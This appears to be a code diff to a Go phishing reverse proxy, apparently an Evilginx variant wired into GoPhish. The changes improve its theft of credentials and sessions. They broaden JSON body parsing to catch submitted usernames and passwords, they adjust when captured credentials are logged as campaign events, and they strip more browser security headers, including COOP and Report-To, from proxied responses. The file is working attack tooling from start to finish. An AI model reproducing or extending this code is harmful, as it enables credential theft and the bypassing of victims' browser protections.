@@ -231,7 +231,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
-					// Remove Whitelisting, let webserver handle that
+					// Remove Whitelisting, let webserver handle that and fix NAT issue
 					// if err != nil && !p.isWhitelistedIP(remote_addr) {
 					if err != nil {
 						if !p.cfg.IsSiteHidden(pl_name) {
@@ -478,8 +478,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						log.Debug("POST body = %s", body)
 
 						contentType := req.Header.Get("Content-type")
-						if contentType == "application/json" {
-
+						// JSON fix from EvilGoPhish
+						// if contentType == "application/json" {
+						jr, _ := regexp.Compile("json")
+						jmatch := jr.FindAllString(contentType, -1)
+						if len(jmatch) != 0 {
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
@@ -556,6 +559,16 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+											// If we successfull captured credentials, log it to GoPhish
+											if len(gpe.ClientID) != 0 && len(p.sessions[ps.SessionId].Password) != 0 {
+												gpe.Event = EventDataSubmit
+												gpe.Username = p.sessions[ps.SessionId].Username
+												gpe.Password = p.sessions[ps.SessionId].Password
+												err := database.HandleGoPhishEvent(gpe)
+												if err != nil {
+													log.Error("failed to add %s event to database: %s", gpe.Event, err)
+												}
+											}
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -567,7 +580,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// If we successfull captured credentials, log it to GoPhish
-											if len(gpe.ClientID) != 0 && len(p.sessions[ps.SessionId].Password) != 0 {
+											if len(gpe.ClientID) != 0 && len(p.sessions[ps.SessionId].Username) != 0 {
 												gpe.Event = EventDataSubmit
 												gpe.Username = p.sessions[ps.SessionId].Username
 												gpe.Password = p.sessions[ps.SessionId].Password
@@ -586,16 +599,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
-												}
-												// If we successfull captured credentials, log it to GoPhish
-												if len(gpe.ClientID) != 0 && len(p.sessions[ps.SessionId].Username) != 0 {
-													gpe.Event = EventDataSubmit
-													gpe.Username = p.sessions[ps.SessionId].Username
-													gpe.Password = p.sessions[ps.SessionId].Password
-													err := database.HandleGoPhishEvent(gpe)
-													if err != nil {
-														log.Error("failed to add %s event to database: %s", gpe.Event, err)
-													}
 												}
 											}
 										}
@@ -697,6 +700,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
 			var rm_headers = []string{
+				"Cross-Origin-Opener-Policy-Report-Only",
+				"Cross-Origin-Opener-Policy",
+				"Report-To",
 				"Cross-Origin-Resource-Policy",
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
@@ -826,6 +832,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											}
 										}
 									}
+								}
+								// Mimefix from Evilgophish
+								if len(mime) == 0 {
+									mime = sf.mime[0]
 								}
 								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
 									re_s := sf.regexp
